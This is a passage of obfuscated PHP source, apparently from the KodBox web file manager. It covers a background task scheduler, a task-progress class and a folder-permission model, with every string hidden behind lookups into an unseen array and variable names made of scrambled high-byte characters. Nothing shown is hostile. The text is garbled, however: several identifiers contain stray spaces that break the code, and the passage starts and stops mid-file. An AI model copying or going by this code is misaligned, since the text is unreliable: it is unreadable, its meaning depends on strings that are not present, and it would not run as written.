self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[®»±”ó²][920])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $øœß·Û =& $_SERVER[®»±”ó²]; if (self::valueGet($øœß·Û[830]) != $øœß·Û[91]) { return; } if (self::valueGet($øœß·Û[1740]) == $øœß·Û[91]) { $ø¸ú¯áÉ = self::valueGet($øœß·Û[1741]); if (time() - $ø¸ú¯áÉ > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($øœß·Û[1740], $øœß·Û[91]); self::log($øœß·Û[1742] . ACTION . $øœß·Û[1743]); Hook::bind($øœß·Û[1744], $øœß·Û[1745]); $ù¿Œß€ù = 0; while (!0) { self::cacheClear(); if (self::valueGet($øœß·Û[830]) != $øœß·Û[91]) { self::valueSet($øœß·Û[1740], $øœß·Û[231]); self::log($øœß·Û[1746]); die; } $ÌÌ’ø± = time(); if ($ÌÌ’ø± - $ù¿Œß€ù >= 60) { self::valueSet(array($øœß·Û[1740] => $øœß·Û[91], $øœß·Û[1741] => $ÌÌ’ø±)); $ù¿Œß€ù = $ÌÌ’ø±; } if (!file_exists(USER_SYSTEM . $øœß·Û[1747])) { self::valueSet(array($øœß·Û[1740] => $øœß·Û[231], $øœß·Û[830] => $øœß·Û[231])); self::log($øœß·Û[1748]); die; } $æŒõ§Î« = file_get_contents(BASIC_PATH . $øœß·Û[1749]); $öÍªİƒ = KOD_VERSION . $øœß·Û[10] . KOD_VERSION_BUILD; $·ÕÃ«Œ = match_text($æŒõ§Î«, $øœß·Û[1750]) . $øœß·Û[10] . match_text($æŒõ§Î«, $øœß·Û[1751]); if ($·ÕÃ«Œ != $öÍªİƒ) { self::restart(); self::log("\x73\164\x6f\x70\145\x64\56\x5b\x76\145\x72\163\x69\157\x6e\x20\x75\160\144\141\x74\145\73{$versionNow}\40\75\x3e\x20{$version}\135"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $äª»Ì‘ã =& $_SERVER[®»±”ó²]; http_close(); $GLOBALS[$äª»Ì‘ã[1752]] = 1; $_SERVER[$äª»Ì‘ã[1753]] = $äª»Ì‘ã[1754]; $_COOKIE = array(); $GLOBALS[$äª»Ì‘ã[1755]] = 1; $GLOBALS[$äª»Ì‘ã[1756]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $™©ë¨Ï­ =& $_SERVER[®»±”ó²]; http_close(); self::valueSet($™©ë¨Ï­[830], $™©ë¨Ï­[231]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($™©ë¨Ï­[1740] => $™©ë¨Ï­[231], $™©ë¨Ï­[830] => $™©ë¨Ï­[91])); self::log($™©ë¨Ï­[1757]); } public static function taskSwitch() { $ş²Í”èŸ =& $_SERVER[®»±”ó²]; $â…‘÷ú¬ = self::valueGet($ş²Í”èŸ[830]) == $ş²Í”èŸ[91] ? $ş²Í”èŸ[231] : $ş²Í”èŸ[91]; self::valueSet($ş²Í”èŸ[830], $â…‘÷ú¬); } public static function shutdownEvent() { $éÈ³¤Òå =& $_SERVER[®»±”ó²]; self::valueSet($éÈ³¤Òå[1740], $éÈ³¤Òå[231]); self::log($éÈ³¤Òå[1758]); } public static function config($×ü•íë´, $€ó¹æ¨Ş) { self::valueSet($_SERVER[®»±”ó²][830], $×ü•íë´); } private static function taskRunAll() { $•î±÷ó =& $_SERVER[®»±”ó²]; $¼Ü¼Ë»ä = timeFloat(); $Ğ×ê›Ì„ = Model($•î±÷ó[1759])->listData(); $ı›¿¡ô = count($Ğ×ê›Ì„); for ($¥‹‚­¸¥ = 0; $¥‹‚­¸¥ < $ı›¿¡ô; $¥‹‚­¸¥++) { $ ùßƒå´ = $Ğ×ê›Ì„[$¥‹‚­¸¥]; if (!$ ùßƒå´[$•î±÷ó[477]] || $ ùßƒå´[$•î±÷ó[1760]] != $•î±÷ó[91]) { continue; } if (!self::taskTimeCheck($ ùßƒå´)) { continue; } self::taskRun($ ùßƒå´); } Hook::trigger($•î±÷ó[1761]); self::taskQueueRun($¼Ü¼Ë»ä); } private static function taskQueueRun($¬‘šñ»î) { $°¸¤Ÿå = 10; while (!0) { $ç•Ù’úè = TaskQueue::run(); if ($ç•Ù’úè === !1) { break; } if (timeFloat() - $¬‘šñ»î >= $°¸¤Ÿå) { break; } } } private static function taskTimeCheck($Ïš¡ä·„) { $’›‚Êå =& $_SERVER[®»±”ó²]; $ŞÖğÂÈ· = json_decode($Ïš¡ä·„[$’›‚Êå[207]], !0); $íÀîÎü = intval($Ïš¡ä·„[$’›‚Êå[1741]]); $’éæô³ğ = strtotime($’›‚Êå[1762] . $ŞÖğÂÈ·[$’›‚Êå[1763]] . $’›‚Êå[1764]) - strtotime($’›‚Êå[1765]); $ìÒúñ = time() - strtotime(date($’›‚Êå[1766]) . $’›‚Êå[1767]); $Î‹åÙŸº = $ìÒúñ >= $’éæô³ğ && $ìÒúñ <= $’éæô³ğ + 3600; switch ($ŞÖğÂÈ·[$’›‚Êå[33]]) { case $’›‚Êå[1768]: if (time() - $íÀîÎü < 3600 * 24 * 30) { return !1; } if ($ŞÖğÂÈ·[$’›‚Êå[1768]] == date($’›‚Êå[1769]) && $Î‹åÙŸº) { return !0; } break; case $’›‚Êå[1770]: if (time() - $íÀîÎü < 3600 * 24 * 7) { return !1; } $í÷Õ…í™ = date($’›‚Êå[1771]) == 0 ? 7 : date($’›‚Êå[1771]); if ($ŞÖğÂÈ·[$’›‚Êå[1770]] == $í÷Õ…í™ && $Î‹åÙŸº) { return !0; } break; case $’›‚Êå[1763]: if (time() - $íÀîÎü < 3600 * 24) { return !1; } if ($Î‹åÙŸº) { return !0; } break; case $’›‚Êå[1772]: if (time() - $íÀîÎü >= floatval($ŞÖğÂÈ·[$’›‚Êå[1772]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $şºÓ‹®ì =& $_SERVER[®»±”ó²]; static $¹¯Æğõ = 0; $ĞÈ÷¬Ùè = 300; if (!$¹¯Æğõ) { $¹¯Æğõ = time(); } if (time() - $¹¯Æğõ < $ĞÈ÷¬Ùè) { return; } $¹¯Æğõ = time(); $÷šÏ±·£ = Model($şºÓ‹®ì[590])->db($şºÓ‹®ì[12]); if ($÷šÏ±·£) { $÷šÏ±·£->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($şºÓ‹®ì[1773], $şºÓ‹®ì[1774]); die; } } public static function taskRun($òÍ›‹ø) { $°ê¨’Î£ =& $_SERVER[®»±”ó²]; self::log($°ê¨’Î£[1775] . $òÍ›‹ø[$°ê¨’Î£[477]] . $°ê¨’Î£[1776] . $òÍ›‹ø[$°ê¨’Î£[32]] . $°ê¨’Î£[1777] . $òÍ›‹ø[$°ê¨’Î£[1778]]); Model($°ê¨’Î£[1759])->run($òÍ›‹ø[$°ê¨’Î£[477]]); $•ÓæüÅ = timeFloat(); $£†“Š¨Î = $°ê¨’Î£[12]; switch ($òÍ›‹ø[$°ê¨’Î£[33]]) { case $°ê¨’Î£[384]: $˜¦š•§ = url_request($òÍ›‹ø[$°ê¨’Î£[1778]], $°ê¨’Î£[1515], !1, !1, !1, !1, 10); if ($˜¦š•§[$°ê¨’Î£[830]]) { $£†“Š¨Î = strlen($˜¦š•§[$°ê¨’Î£[1299]]); } break; case $°ê¨’Î£[1779]: $£†“Š¨Î = Hook::apply($òÍ›‹ø[$°ê¨’Î£[1778]]); default: break; } Model($°ê¨’Î£[1780])->add(array($°ê¨’Î£[1781] => $°ê¨’Î£[12], $°ê¨’Î£[1782] => $°ê¨’Î£[231], $°ê¨’Î£[33] => $°ê¨’Î£[1783] . $òÍ›‹ø[$°ê¨’Î£[477]], $°ê¨’Î£[1784] => json_encode(array($°ê¨’Î£[32] => $òÍ›‹ø[$°ê¨’Î£[32]], $°ê¨’Î£[1785] => timeFloat() - $•ÓæüÅ, $°ê¨’Î£[836] => $£†“Š¨Î)))); $ˆìöÍÄÀ = $£†“Š¨Î ? $°ê¨’Î£[1786] . $£†“Š¨Î : $°ê¨’Î£[12]; self::log($°ê¨’Î£[1787] . $òÍ›‹ø[$°ê¨’Î£[477]] . $°ê¨’Î£[178] . $ˆìöÍÄÀ); return !0; } public static function valueGet($àûìÆà) { $àÒô¸©Ê =& $_SERVER[®»±”ó²]; $¡ÈÌš½Ÿ = $àÒô¸©Ê[1788]; $îùÛä´Ä = Model($àÒô¸©Ê[519])->get($àûìÆà, $¡ÈÌš½Ÿ); if (is_null($îùÛä´Ä)) { Model($àÒô¸©Ê[519])->set($àÒô¸©Ê[830], $àÒô¸©Ê[91], $¡ÈÌš½Ÿ); Model($àÒô¸©Ê[519])->set($àÒô¸©Ê[1740], $àÒô¸©Ê[231], $¡ÈÌš½Ÿ); $îùÛä´Ä = Model($àÒô¸©Ê[519])->get($àûìÆà, $¡ÈÌš½Ÿ); } return $îùÛä´Ä; } private static function valueSet($øà£ˆ­, $¹î¬ˆã = false) { $§İºœ”² =& $_SERVER[®»±”ó²]; $Œü•¯£ï = $§İºœ”²[1789]; CacheLock::lock($Œü•¯£ï); $ôõøĞ¶ë = Model($§İºœ”²[519])->set($øà£ˆ­, $¹î¬ˆã, $§İºœ”²[1788]); CacheLock::unlock($Œü•¯£ï); return $ôõøĞ¶ë; } protected static function log($Ã £ôú) { write_log($Ã £ôú, $_SERVER[®»±”ó²][1774]); } private static function cacheClear() { $Š¯üÇ…ç =& $_SERVER[®»±”ó²]; Cache::clearMemory(Model($Š¯üÇ…ç[519])->cacheKey($Š¯üÇ…ç[1788])); Cache::clearMemory(Model($Š¯üÇ…ç[519])->cacheKey($Š¯üÇ…ç[1790])); Model($Š¯üÇ…ç[1759])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\x73\164\x6f\160"; const STATYS_RUNNING = "\x72\165\156\156\151\x6e\147"; const STATYS_KILL = "\153\x69\154\x6c"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($ËæÔàÒø, $·åÈÄáØ = '', $éúöŞğ¸ = 0, $¼úúÃí = '') { $ŸÚî¸´ =& $_SERVER[®»±”ó²]; if (self::get($ËæÔàÒø)) { return; } $this->task = array($ŸÚî¸´[477] => $ËæÔàÒø, $ŸÚî¸´[1791] => USER_ID, $ŸÚî¸´[1678] => $¼úúÃí, $ŸÚî¸´[537] => $ŸÚî¸´[12], $ŸÚî¸´[33] => $·åÈÄáØ, $ŸÚî¸´[1152] => $ŸÚî¸´[12], $ŸÚî¸´[1150] => $éúöŞğ¸, $ŸÚî¸´[1792] => 0, $ŸÚî¸´[1793] => 0, $ŸÚî¸´[1794] => 0, $ŸÚî¸´[1795] => timeFloat(), $ŸÚî¸´[1796] => 0, $ŸÚî¸´[1797] => 0, $ŸÚî¸´[1798] => 0, $ŸÚî¸´[1799] => 0, $ŸÚî¸´[830] => $ŸÚî¸´[1740]); $GLOBALS[$ŸÚî¸´[1800]] = 1; Hook::bind($ŸÚî¸´[1744], array($this, $ŸÚî¸´[1801])); Hook::bind($ŸÚî¸´[1802], array($this, $ŸÚî¸´[1803])); $this->startAfter(); Hook::trigger($ŸÚî¸´[1804], $this->task); $this->task[$ŸÚî¸´[1797]] = timeFloat(); } public function end($ŸŞùê = '') { $®‡ç½áÃ =& $_SERVER[®»±”ó²]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$®‡ç½áÃ[1797]]) { self::valueSet($this->task[$®‡ç½áÃ[477]], !1); } $this->isEnd = !0; if ($ŸŞùê) { $this->task[$®‡ç½áÃ[537]] = $ŸŞùê; } self::log($®‡ç½áÃ[1805] . $this->task[$®‡ç½áÃ[477]] . $®‡ç½áÃ[1806] . sprintf($®‡ç½áÃ[938], timeFloat() - $this->task[$®‡ç½áÃ[1795]]) . $®‡ç½áÃ[1807]); Hook::unbind($®‡ç½áÃ[1744], array($this, $®‡ç½áÃ[1801])); Hook::unbind($®‡ç½áÃ[1802], array($this, $®‡ç½áÃ[1803])); $this->endAfter(); $Ÿı¦‰ = $this->task; $this->task = !1; Hook::trigger($®‡ç½áÃ[1808], $Ÿı¦‰); } public function update($»¬®œğ™ = 0, $À¹½¿ƒÍ = false) { $ÎªäÜƒì =& $_SERVER[®»±”ó²]; $‰±€«áÔ =& $this->task; if (!$‰±€«áÔ) { return; } $‰±€«áÔ[$ÎªäÜƒì[1792]] += $»¬®œğ™; $‰±€«áÔ[$ÎªäÜƒì[1796]] = timeFloat(); if ($‰±€«áÔ[$ÎªäÜƒì[1150]]) { if ($‰±€«áÔ[$ÎªäÜƒì[1150]] < $‰±€«áÔ[$ÎªäÜƒì[1792]]) { $‰±€«áÔ[$ÎªäÜƒì[1150]] = $‰±€«áÔ[$ÎªäÜƒì[1792]]; } $¹¾ò£Óº = timeFloat() - $‰±€«áÔ[$ÎªäÜƒì[1795]] - $‰±€«áÔ[$ÎªäÜƒì[1798]]; if ($¹¾ò£Óº <= 0) { $¹¾ò£Óº = 0.001; } $‰±€«áÔ[$ÎªäÜƒì[1793]] = $‰±€«áÔ[$ÎªäÜƒì[1792]] / $‰±€«áÔ[$ÎªäÜƒì[1150]]; $‰±€«áÔ[$ÎªäÜƒì[1794]] = $‰±€«áÔ[$ÎªäÜƒì[1792]] / $¹¾ò£Óº; if ($‰±€«áÔ[$ÎªäÜƒì[1793]] > 0) { $‰±€«áÔ[$ÎªäÜƒì[1799]] = $¹¾ò£Óº * (1 - $‰±€«áÔ[$ÎªäÜƒì[1793]]) / $‰±€«áÔ[$ÎªäÜƒì[1793]]; } $‰±€«áÔ[$ÎªäÜƒì[1799]] = $‰±€«áÔ[$ÎªäÜƒì[1799]] <= 0 ? 0 : $‰±€«áÔ[$ÎªäÜƒì[1799]]; } $this->updateAfter(); $Ñ³ó¶»È = 0.2; if (timeFloat() - $‰±€«áÔ[$ÎªäÜƒì[1797]] < $Ñ³ó¶»È && !$À¹½¿ƒÍ) { return; } $ÛÉà»‡¹ = self::get($‰±€«áÔ[$ÎªäÜƒì[477]]); $¡ã‰¿Ğ = $ÛÉà»‡¹[$ÎªäÜƒì[830]]; if ($¡ã‰¿Ğ == self::STATYS_KILL) { $‰üŒ¦² = array($ÎªäÜƒì[1809] => LNG($ÎªäÜƒì[1810]), $ÎªäÜƒì[1309] => !1); Cache::set($ÎªäÜƒì[1811] . $this->task[$ÎªäÜƒì[477]], $‰üŒ¦², 30); $this->onKill(); $this->end(); die; } else { if ($¡ã‰¿Ğ == self::STATYS_STOP) { $„½‰ú“Ì = 2; $ÛÉà»‡¹[$ÎªäÜƒì[1798]] += $„½‰ú“Ì; self::valueSet($‰±€«áÔ[$ÎªäÜƒì[477]], $ÛÉà»‡¹); sleep($„½‰ú“Ì); $this->update(); return; } } $‰±€«áÔ[$ÎªäÜƒì[830]] = $¡ã‰¿Ğ ? $¡ã‰¿Ğ : $‰±€«áÔ[$ÎªäÜƒì[830]]; $‰±€«áÔ[$ÎªäÜƒì[1798]] = $ÛÉà»‡¹[$ÎªäÜƒì[1798]] ? $ÛÉà»‡¹[$ÎªäÜƒì[1798]] : 0; $‰±€«áÔ[$ÎªäÜƒì[1797]] = timeFloat(); Hook::trigger($ÎªäÜƒì[1812], $‰±€«áÔ); self::valueSet($‰±€«áÔ[$ÎªäÜƒì[477]], $‰±€«áÔ); } public function onKillSet($Ê—Œ·•Ä, $‚ÎñØ³— = array()) { $this->onKillCall = array($Ê—Œ·•Ä, $‚ÎñØ³—); } public function onKill() { $Œ¯ê¬·Ğ =& $_SERVER[®»±”ó²]; self::log($Œ¯ê¬·Ğ[1805] . $this->task[$Œ¯ê¬·Ğ[477]] . $Œ¯ê¬·Ğ[1813]); Hook::trigger($Œ¯ê¬·Ğ[1814], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($Ğ¤áˆ‰ş) { $ê€©­ü× =& $_SERVER[®»±”ó²]; Cache::set($ê€©­ü×[1811] . $this->task[$ê€©­ü×[477]], $Ğ¤áˆ‰ş, 60); if (!is_array($Ğ¤áˆ‰ş) || !$Ğ¤áˆ‰ş[$ê€©­ü×[1309]]) { self::log($ê€©­ü×[1815] . json_encode($Ğ¤áˆ‰ş)); } return $Ğ¤áˆ‰ş; } public static function get($¯¾ßşŞ¸) { $Øî°­ùÛ =& $_SERVER[®»±”ó²]; $ºƒ¸Ú»¥ = self::valueGet($¯¾ßşŞ¸); if (is_array($ºƒ¸Ú»¥) && $ºƒ¸Ú»¥[$Øî°­ùÛ[1816]]) { $öñ»¥ä = ActionApply($ºƒ¸Ú»¥[$Øî°­ùÛ[1816]], array($ºƒ¸Ú»¥)); $ºƒ¸Ú»¥ = is_array($öñ»¥ä) ? $öñ»¥ä : $ºƒ¸Ú»¥; } return $ºƒ¸Ú»¥; } public static function listData() { $½óáğ¯ˆ = self::valueGet(); return array_sort_by($½óáğ¯ˆ, $_SERVER[®»±”ó²][1795], !0); } public static function kill($š÷ÅË¡) { return self::changeStatus($š÷ÅË¡, self::STATYS_KILL); } public static function stop($Ğ¥¶¹òâ) { return self::changeStatus($Ğ¥¶¹òâ, self::STATYS_STOP); } public static function restart($£°‘Şóš) { return self::changeStatus($£°‘Şóš, self::STATYS_RUNNING); } public static function killAll() { $°¸·ßûğ =& $_SERVER[®»±”ó²]; $úÁû’ = self::listData(); foreach ($úÁû’ as $™°Íùõƒ) { self::kill($™°Íùõƒ[$°¸·ßûğ[477]]); } sleep(2); foreach ($úÁû’ as $™°Íùõƒ) { self::valueSet($™°Íùõƒ[$°¸·ßûğ[477]], !1); } } private static function changeStatus($©ñÑ»ì×, $’‘‘ƒè) { $Óë×íÚ =& $_SERVER[®»±”ó²]; $¤¶‚½ôİ = self::valueGet($©ñÑ»ì×); if (!$¤¶‚½ôİ) { return !1; } $¤¶‚½ôİ[$Óë×íÚ[830]] = $’‘‘ƒè; self::valueSet($©ñÑ»ì×, $¤¶‚½ôİ); self::log($Óë×íÚ[1817] . $¤¶‚½ôİ[$Óë×íÚ[477]] . $Óë×íÚ[1818] . $’‘‘ƒè); return !0; } public static function valueGet($ÊÄ›¾­Š = false) { $ÚõÁ¯í‹ =& $_SERVER[®»±”ó²]; if ($ÊÄ›¾­Š) { $·¶©èéÂ = Model($ÚõÁ¯í‹[531])->where(array($ÚõÁ¯í‹[97] => $ÊÄ›¾­Š, $ÚõÁ¯í‹[33] => $ÚõÁ¯í‹[1159]))->find(); return $·¶©èéÂ ? json_decode($·¶©èéÂ[$ÚõÁ¯í‹[452]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($ğ’Ñ§Ø» = false) { $Ö¬ñË§Õ =& $_SERVER[®»±”ó²]; $‘À°´ù¯ = array($Ö¬ñË§Õ[33] => $Ö¬ñË§Õ[1159]); if ($ğ’Ñ§Ø») { $‘À°´ù¯[$Ö¬ñË§Õ[1791]] = $ğ’Ñ§Ø»; } $–èÖÏÌ” = Model($Ö¬ñË§Õ[531])->where($‘À°´ù¯)->select(); $–èÖÏÌ” = $–èÖÏÌ” ? $–èÖÏÌ” : array(); foreach ($–èÖÏÌ” as $¿ƒ÷å¯š => $–Å‡óñ) { $–èÖÏÌ”[$¿ƒ÷å¯š] = json_decode($–Å‡óñ[$Ö¬ñË§Õ[452]], !0); } return $–èÖÏÌ”; } public static function valueSet($•İû¤™Â, $‘‚¶©«Ÿ) { $¨Æí‰œŸ =& $_SERVER[®»±”ó²]; if (!$‘‚¶©«Ÿ) { return Model($¨Æí‰œŸ[531])->where(array($¨Æí‰œŸ[97] => $•İû¤™Â, $¨Æí‰œŸ[33] => $¨Æí‰œŸ[1159]))->delete(); } $÷˜æ‰Ú½ = json_encode($‘‚¶©«Ÿ); if (!$÷˜æ‰Ú½) { ob_start(); var_dump($‘‚¶©«Ÿ); $±ÏğÂÖ = ob_get_clean(); self::log($¨Æí‰œŸ[1819] . json_encode_force($±ÏğÂÖ)); } if (!$•İû¤™Â || !$‘‚¶©«Ÿ[$¨Æí‰œŸ[477]]) { return !1; } $»Ì«Óì = array($¨Æí‰œŸ[33] => $¨Æí‰œŸ[1159], $¨Æí‰œŸ[1791] => USER_ID, $¨Æí‰œŸ[97] => $•İû¤™Â, $¨Æí‰œŸ[452] => $÷˜æ‰Ú½); $Õ“¹ê­Ø = $¨Æí‰œŸ[1820]; CacheLock::lock($Õ“¹ê­Ø); Model($¨Æí‰œŸ[531])->add($»Ì«Óì, array(), !0); CacheLock::unlock($Õ“¹ê­Ø); } public static function log($Áçâ”ã¬) { if (!GLOBAL_DEBUG) { return; } write_log($Áçâ”ã¬, $_SERVER[®»±”ó²][1821]); } } goto d ÏÕË…„“; BßÎê…‹â¼: class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\137\x73\x6f\x75\162\143\145\137\141\165\x74\x68"; public function getAuth($¸ ùË”Ú) { $Ø—·†Æ¢ =& $_SERVER[®»±”ó²]; $ˆÉåíßƒ = $this->sourceAuthSelect($¸ ùË”Ú); $ßåşâúÄ = array(); $ËÒêôŞä = array(); $óë·ÛÃø = 2 << 25; foreach ($ˆÉåíßƒ as $×„Ñ¸) { $â˜ôæÍ = Model($Ø—·†Æ¢[584])->listData($×„Ñ¸[$Ø—·†Æ¢[2100]]); if (!$â˜ôæÍ) { continue; } $ßåşâúÄ[] = $×„Ñ¸; $˜ˆîƒÁ° = 0; if ($×„Ñ¸[$Ø—·†Æ¢[191]] == SourceModel::TYPE_GROUP) { $˜ˆîƒÁ° = $óë·ÛÃø * 2; } if ($×„Ñ¸[$Ø—·†Æ¢[191]] == SourceModel::TYPE_USER) { $˜ˆîƒÁ° = $óë·ÛÃø; } if ($×„Ñ¸[$Ø—·†Æ¢[191]] == SourceModel::TYPE_USER && $×„Ñ¸[$Ø—·†Æ¢[582]] == $Ø—·†Æ¢[231]) { $˜ˆîƒÁ° = 0; } $ËÒêôŞä[] = $â˜ôæÍ[$Ø—·†Æ¢[498]] + $˜ˆîƒÁ°; } array_multisort($ËÒêôŞä, SORT_DESC, $ßåşâúÄ); return $ßåşâúÄ; } public function sourceAuthSelect($¯•±æ©¯) { $õ‚Â¬Î =& $_SERVER[®»±”ó²]; static $ş÷£Ò«˜ = array(); $Üñ¸Å§Á = is_array($¯•±æ©¯) ? !1 : !0; if ($Üñ¸Å§Á) { $¯•±æ©¯ = array($¯•±æ©¯); } $†á”ØÔÃ = array(); foreach ($¯•±æ©¯ as $ûœ• Á) { if (isset($ş÷£Ò«˜[$ûœ• Á])) { $†á”ØÔÃ[$ûœ• Á] = $ş÷£Ò«˜[$ûœ• Á]; } } if (count($†á”ØÔÃ) == count($¯•±æ©¯)) { return $Üñ¸Å§Á ? $†á”ØÔÃ[$¯•±æ©¯[0]] : $†á”ØÔÃ; } $”ºñœª = $õ‚Â¬Î[2180]; $æ´Ÿß¦û = array($õ‚Â¬Î[194] => array($õ‚Â¬Î[7], $¯•±æ©¯)); $©Øª²Æˆ = $this->field($”ºñœª)->order($õ‚Â¬Î[477])->where($æ´Ÿß¦û)->select(); $ šÈ•÷ü = array_to_keyvalue_group($©Øª²Æˆ, $õ‚Â¬Î[194]); foreach ($¯•±æ©¯ as $ûœ• Á) { $ş÷£Ò«˜[$ûœ• Á] = $ šÈ•÷ü[$ûœ• Á] ? $ šÈ•÷ü[$ûœ• Á] : array(); } if ($Üñ¸Å§Á) { return $©Øª²Æˆ; } return $ šÈ•÷ü; } public function setAuth($¥¥¦Ç°å, $Å„¸×³—) { $Ü¨³ÈŠ½ =& $_SERVER[®»±”ó²]; $¬ÁÏ–ñ‚ = Model($Ü¨³ÈŠ½[1440])->sourceInfo($¥¥¦Ç°å); if (!$¬ÁÏ–ñ‚) { return !1; } if ($¬ÁÏ–ñ‚[$Ü¨³ÈŠ½[191]] != SourceModel::TYPE_GROUP) { return !1; } $ËØ×ò· = 1; $Ñ†õ‘œ· = $¬ÁÏ–ñ‚[$Ü¨³ÈŠ½[582]]; if ($Ñ†õ‘œ· != $ËØ×ò·) { $ŞœÔ£À‡ = array($Ü¨³ÈŠ½[1402] => $Ñ†õ‘œ·); $¹Ôõå± = Model($Ü¨³ÈŠ½[2086])->field($Ü¨³ÈŠ½[1791])->where($ŞœÔ£À‡)->select(); $¹Ôõå± = array_to_keyvalue($¹Ôõå±, $Ü¨³ÈŠ½[12], $Ü¨³ÈŠ½[1791]); } $”ˆ¯•û = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $ıêÖ –î = array(); foreach ($Å„¸×³— as $Ü°ÚÍ‰) { if (!in_array($Ü°ÚÍ‰[$Ü¨³ÈŠ½[191]], $”ˆ¯•û)) { show_json(LNG($Ü¨³ÈŠ½[2181]), !1); } if ($Ñ†õ‘œ· != $ËØ×ò·) { if ($Ü°ÚÍ‰[$Ü¨³ÈŠ½[191]] == SourceModel::TYPE_GROUP) { } if ($Ü°ÚÍ‰[$Ü¨³ÈŠ½[582]] != 0 && !in_array($Ü°ÚÍ‰[$Ü¨³ÈŠ½[582]], $¹Ôõå±)) { } } if ($Ü°ÚÍ‰[$Ü¨³ÈŠ½[582]] == 0) { $Ü°ÚÍ‰[$Ü¨³ÈŠ½[191]] = SourceModel::TYPE_USER; } $ıêÖ –î[] = array($Ü¨³ÈŠ½[194] => $¥¥¦Ç°å, $Ü¨³ÈŠ½[191] => intval($Ü°ÚÍ‰[$Ü¨³ÈŠ½[191]]), $Ü¨³ÈŠ½[582] => intval($Ü°ÚÍ‰[$Ü¨³ÈŠ½[582]]), $Ü¨³ÈŠ½[2100] => intval($Ü°ÚÍ‰[$Ü¨³ÈŠ½[2100]]) ? intval($Ü°ÚÍ‰[$Ü¨³ÈŠ½[2100]]) : 0, $Ü¨³ÈŠ½[2163] => intval($Ü°ÚÍ‰[$Ü¨³ÈŠ½[2163]]) ? intval($Ü°ÚÍ‰[$Ü¨³ÈŠ½[2163]]) : -1); } $this->where(array($Ü¨³ÈŠ½[502] => $¥¥¦Ç°å))->delete(); $this->addAll($ıêÖ –î); return !0; } public function authClear($ş±ÇÖÑ×) { $¤ˆˆõ =& $_SERVER[®»±”ó²]; $çèğšÒ = Model($¤ˆˆõ[1440])->sourceInfo($ş±ÇÖÑ×); $ÑÇ»«Ú« = array($ş±ÇÖÑ×); if ($çèğšÒ[$¤ˆˆõ[496]] == $¤ˆˆõ[91]) { $Šº‡°ù¯ = array($¤ˆˆõ[668] => array($¤ˆˆõ[628], $çèğšÒ[$¤ˆˆõ[597]] . $ş±ÇÖÑ× . $¤ˆˆõ[629])); $ÑÇ»«Ú« = Model($¤ˆˆõ[1440])->field($¤ˆˆõ[502])->where($Šº‡°ù¯)->getField($¤ˆˆõ[194], !0); $ÑÇ»«Ú«[] = $ş±ÇÖÑ×; } $this->where(array($¤ˆˆõ[502] => array($¤ˆˆõ[503], $ÑÇ»«Ú«)))->delete(); return !0; } public function getAllChildren($à·Õäí) { $ÇœÊêµ =& $_SERVER[®»±”ó²]; $À ÜÓ‘ø = Model($ÇœÊêµ[1440])->sourceInfo($à·Õäí); if ($À ÜÓ‘ø[$ÇœÊêµ[496]] != $ÇœÊêµ[91]) { return $this->sourceListAuth(array($à·Õäí)); } if ($À ÜÓ‘ø[$ÇœÊêµ[191]] != SourceModel::TYPE_GROUP) { return array(); } $‡¥Ï = 1; $ª‡µãŠ = array($à·Õäí); if ($À ÜÓ‘ø[$ÇœÊêµ[193]] == $ÇœÊêµ[231] && $À ÜÓ‘ø[$ÇœÊêµ[582]] != $‡¥Ï) { $ª‡µãŠ = $this->groupChidldAllRootSource($À ÜÓ‘ø[$ÇœÊêµ[582]]); } $‰Éâ£è = $this->field($ÇœÊêµ[194])->group($ÇœÊêµ[194])->select(); $‰Éâ£è = array_to_keyvalue($‰Éâ£è, $ÇœÊêµ[12], $ÇœÊêµ[194]); if (!$‰Éâ£è) { return array(); } $‡ÈéüÌ– = $ÇœÊêµ[2182]; $©Ã£ÇÁÙ = array($ÇœÊêµ[194] => array($ÇœÊêµ[7], $‰Éâ£è), $ÇœÊêµ[516] => $ÇœÊêµ[231]); $’²•Š¤ó = Model($ÇœÊêµ[911])->field($‡ÈéüÌ–)->where($©Ã£ÇÁÙ)->select(); $äõæƒÂÜ = array($à·Õäí); foreach ($’²•Š¤ó as $‹‡¦­‚¿) { foreach ($ª‡µãŠ as $¹³áÃ „) { $²µÉı°  = $ÇœÊêµ[50] . $¹³áÃ „ . $ÇœÊêµ[50]; $— ç‰çÜ = $‹‡¦­‚¿[$ÇœÊêµ[597]] . $‹‡¦­‚¿[$ÇœÊêµ[194]] . $ÇœÊêµ[50]; if (strstr($— ç‰çÜ, $²µÉı° )) { $äõæƒÂÜ[] = $‹‡¦­‚¿[$ÇœÊêµ[194]]; break; } } } return $this->sourceListAuth($äõæƒÂÜ); } private function sourceListAuth($‚‹˜¹æè) { $Ä’Öô­ï =& $_SERVER[®»±”ó²]; $˜®†Œô = Model($Ä’Öô­ï[1440])->sourceListInfo($‚‹˜¹æè, !0); $Ü´½Ä’¿ = $this->sourceAuthSelect($‚‹˜¹æè); $ÊøÌƒ˜Ç = array(); $õûßŠ‹ú = array(); foreach ($˜®†Œô as $ß÷ßàÇ–) { unset($ß÷ßàÇ–[$Ä’Öô­ï[540]]); unset($ß÷ßàÇ–[$Ä’Öô­ï[538]]); unset($ß÷ßàÇ–[$Ä’Öô­ï[498]]); unset($ß÷ßàÇ–[$Ä’Öô­ï[90]]); $æë…‰ƒ = 